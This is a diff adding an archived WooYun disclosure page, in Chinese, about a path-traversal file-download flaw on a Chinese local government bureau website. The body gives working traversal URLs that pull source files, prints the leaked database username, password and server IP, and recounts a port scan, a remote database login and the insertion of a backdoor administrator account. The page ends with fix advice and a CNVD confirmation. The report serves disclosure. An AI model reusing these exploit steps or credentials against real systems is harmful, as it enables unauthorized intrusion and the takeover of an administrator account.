@@ -1,0 +1,310 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		某市某工商分局任意文件下载及后台数据库劫持  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		某市某工商分局任意文件下载及后台数据库劫持  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/小点兵">小点兵</a> 
+</li><li>提交时间：		2013-05-02 11:00</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-02：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-05-26：	细节向普通白帽子公开<br/>
+									2013-06-05：	细节向实习白帽子公开<br/>
+									2013-06-16：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">通过利用宁波市某工商分局任意文件下载漏洞，成功渗透并劫持后台数据库</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">宁波市工商分局大榭开发区分局文件下载功能由于过滤不严格，可任意下载网站源文件。通过分析，成功劫持后台数据库并取得网站管理员权限 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">本次渗透纯属实验性质，并无恶意。也未破坏任何数据。<br />
+<br />
+<br />
+<br />
+下载点：<br />
+<br />
+http://www.dx315.gov.cn/download.asp?v=upload/doc/../../download.asp<br />
+<br />
+通过分析download.asp,发现这个下载点有过滤行为<br />
+<br />
+===============================================================<br />
+<br />
+if filename=&quot;&quot; and instr(filename,&quot;upload&quot;)=0  then <br />
+<br />
+	response.write &quot;&lt;script language=&#039;javascript&#039;&gt;alert(&#039;下载文件时参数有误,请确认!&#039;);histoty.go(-1);&lt;/script&gt;&quot;<br />
+<br />
+	response.end <br />
+<br />
+end if<br />
+<br />
+===============================================================<br />
+<br />
+发现只要存在upload都算合法。。。<br />
+<br />
+<br />
+<br />
+网站的后台登陆页面在http://www.dx315.gov.cn/admin/admin_login.asp。提交用户名密码后，要通过http://www.dx315.gov.cn/admin/admin_chk.asp进行验证<br />
+<br />
+我们通过<br />
+<br />
+http://www.dx315.gov.cn/download.asp?v=upload/doc/../../admin/admin_chk.asp<br />
+<br />
+将admin_chk.asp下载下来。经过分析，发现有简单的防SQL注入的检测：<br />
+<br />
+===============================================================<br />
+<br />
+user_name=replace(trim(Request.form(&quot;admin_user&quot;)),&quot;&#039;&quot;,&quot;&quot;)<br />
+<br />
+user_pwd=replace(trim(Request.form(&quot;admin_pwd&quot;)),&quot;&#039;&quot;,&quot;&quot;)<br />
+<br />
+user_veri=replace(trim(Request.form(&quot;v&quot;)),&quot;&#039;&quot;,&quot;&quot;)<br />
+<br />
+===============================================================<br />
+<br />
+不知道这样简单的过滤是否可以完全防止住SQL注入，我们有深究，望高人指点:-) 另外，根据后面的代码分析，发现还有一个专门防SQL注入的代码Check_SI.asp，可是，里面针对post提交数据的检测竟然被注释掉了，汗。<br />
+<br />
+<br />
+<br />
+SQL注入不搞了，我们换个思路，看这一句：<br />
+<br />
+&lt;!--#include file=&quot;../Public/ASP/conn.asp&quot; --&gt;<br />
+<br />
+通过下载<br />
+<br />
+http://www.dx315.gov.cn/download.asp?v=upload/doc/../../Public/ASP/conn.asp <br />
+<br />
+代码如下：<br />
+<br />
+===============================================================<br />
+<br />
+&lt;!--#include file=&quot;Check_SI.asp&quot;--&gt; <br />
+<br />
+<br />
+<br />
+&lt;%<br />
+<br />
+	On Error Resume Next<br />
+<br />
+	Dim ConnStr<br />
+<br />
+	Dim Sqldatabasename,Sqlpassword,Sqlusername,Sqllocalname<br />
+<br />
+	Sqldatabasename = &quot;hsgs&quot;<br />
+<br />
+	Sqlusername = &quot;website&quot;<br />
+<br />
+	Sqlpassword = &quot;nbdxgswebsite&quot;<br />
+<br />
+	Sqllocalname = &quot;127.0.0.1&quot;<br />
+<br />
+	Connstr = &quot;Provider = Sqloledb; User Id =&quot; &amp; Sqlusername &amp; &quot;; Password =&quot; &amp; Sqlpassword &amp; &quot;; Initial Catalog = &quot; &amp; Sqldatabasename &amp; &quot;; Data Source = &quot; &amp; Sqllocalname &amp; &quot;;&quot;<br />
+<br />
+<br />
+<br />
+	Set conn = Server.CreateObject(&quot;ADODB.Connection&quot;)<br />
+<br />
+	conn.open ConnStr<br />
+<br />
+	If Err Then<br />
+<br />
+		Set Conn = Nothing<br />
+<br />
+		Response.Write &quot;数据库连接出错，请检查连接字串。&quot;<br />
+<br />
+		Response.End<br />
+<br />
+	End If<br />
+<br />
+%&gt;<br />
+<br />
+==================================================================<br />
+<br />
+好吧，数据库的用户名是 &quot;website&quot;， 密码是 &quot;nbdxgswebsite&quot; 而且数据库就在本机，没有做库站分离 (Sqllocalname = &quot;127.0.0.1&quot;) <br />
+<br />
+<br />
+<br />
+用nmap扫描www.dx315.gov.cn(ip是112.15.185.43），结果如下图：<br />
+<br />
+</p><p class="detail"><a href="../images/012301578f6c09bbded68cb47e2912152f1dbb42.jpg" target="_blank"><img src="../images/012301578f6c09bbded68cb47e2912152f1dbb42.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+好吧，开了那么多端口，还包括21，135,139等。没有一个一个去试验。不知道是否存在ftp和rpc的弱口令或139RPC缓冲区溢出漏洞.这么多口子，难道这台机器已经被人做成肉鸡了...<br />
+<br />
+<br />
+<br />
+不管其他的，我们的重点在1433/tcp open  ms-sql-s 好吧，远程sql server访问。链上去打开hsgs.dbo.UserInfo表，如下图 （注：最后一行adminroot是我添加的，后面会描述）<br />
+<br />
+</p><p class="detail"><a href="../images/01231135f6d532d280eda69a4b79aebef22e7c6d.jpg" target="_blank"><img src="../images/01231135f6d532d280eda69a4b79aebef22e7c6d.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+到这里基本上大功告成了，所有的数据库都在我们的控制之中了。不过管理员的密码是md5散列过的,试了几个md5字典网站（比如http://www.md5decrypter.co.uk/），发现破解不出. 估计他们的算法不是标准的md5或者是在计算的时候加入了固定的随机数 （这个方法值得推荐，加入随机数进行散列，让字典攻击成为不可能）<br />
+<br />
+<br />
+<br />
+不过这个难不倒我们，直接下载<br />
+<br />
+http://www.dx315.gov.cn/download.asp?v=upload/doc/../../Public/ASP/md5.asp<br />
+<br />
+然后在自己的iis上跑 Response.Write(md5(11111111)) 我们得到 60827015e5d605ed<br />
+<br />
+好吧，我们插入UID=adminroot PWD=60827015e5d605ed 到 hsgs.dbo.UserInfo表中，然后用adminroot+11111111登录http://www.dx315.gov.cn/admin/admin_login.asp，成功进入后台，如下图：<br />
+<br />
+</p><p class="detail"><a href="../images/0123234831783a69de6bb4a58606b2f5605b6f2b.jpg" target="_blank"><img src="../images/0123234831783a69de6bb4a58606b2f5605b6f2b.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1,http://www.dx315.gov.cn/download.asp中做完备的过滤，或者不要这个下载asp了.比方说下载http://www.dx315.gov.cn/download.asp?v=upload/doc/2012215103123195.doc， 直接http://www.dx315.gov.cn/upload/doc/2012215103123195.doc就好了，何必画蛇添足<br />
+<br />
+2，除了80端口，其他不必要的端口，能关的都关了吧<br />
+<br />
+3，将Check_SI.asp中关于post数据过滤的代码打开吧，不然可能引发通过post提交的sql注入<br />
+<br />
+4，将我添加的adminroot给删了，十分感谢 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/小点兵" title="小点兵">小点兵</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-022904" title="某市某工商分局任意文件下载及后台数据库劫持">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：13 </p>
+													<p class="detail">确认时间：2013-05-06 22:15</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并复现所述情况，已在3日转由CNCERT浙江分中心，由其后续协调网站管理方处置。该案例是较为完整的一次由文件包含进行的测试过程。<br />
+<br />
+rank 13<br />
+<br />
+</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="22904";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
